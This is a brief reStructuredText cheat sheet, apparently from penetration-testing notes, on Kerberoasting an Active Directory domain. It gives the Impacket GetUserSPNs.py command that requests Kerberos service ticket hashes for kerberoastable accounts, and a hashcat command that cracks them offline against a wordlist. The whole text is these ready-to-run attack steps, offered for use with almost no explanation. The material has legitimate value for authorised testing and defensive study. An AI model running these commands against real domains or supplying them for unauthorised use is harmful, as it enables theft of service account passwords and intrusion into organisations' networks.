Impacket AD
***************

Kerberoating
##############

This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain. This does not have to be on the targets machine and can be done remotely.

.. code-block:: console

        GetUserSPNs.py domain.Name/User:Password -dc-ip d.c.I.P -request 

Then run hashcat to find the password.

.. code-block:: console

        hashcat -m 13100 -a 0 Userhash.txt PASS.txt --force  
